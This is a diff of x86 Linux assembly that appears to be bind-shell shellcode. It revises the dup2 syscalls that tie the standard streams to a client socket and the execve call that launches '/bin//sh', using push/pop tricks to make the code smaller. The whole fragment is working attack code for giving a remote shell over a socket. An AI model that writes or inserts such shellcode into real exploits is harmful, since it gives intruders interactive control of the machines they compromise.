@@ -86,27 +86,28 @@ mov esi, eax ;save the client socket fd into esi
 ;dup2(clntSock, 1);
 ;dup2(clntSock, 2);
 
-mov al, 0x3f ;dup2
-mov ecx, esi
-xor ebx, ebx
+push byte 0x3f ;dup2
+pop eax
+mov ebx, esi
+xor ecx, ecx
 
 int 0x80
 
-mov al, 0x3f ;dup2
-mov bl, 0x1
-mov ecx, esi
+push byte 0x3f
+pop eax
+inc ecx
 
 int 0x80
 
-mov al, 0x3f ;dup2
-mov bl, 0x2
-mov ecx, esi
+push byte 0x3f
+pop eax
+inc ecx
 
 int 0x80
 
 ;###execve###
-xor eax, eax
-mov al, 0x0b ;sys_execve
+push byte 0xb
+pop eax ;sys_execve
 xor ebx, ebx 
 push ebx ;terminate string with \0
 push 0x68732f2f ;String "hs//"
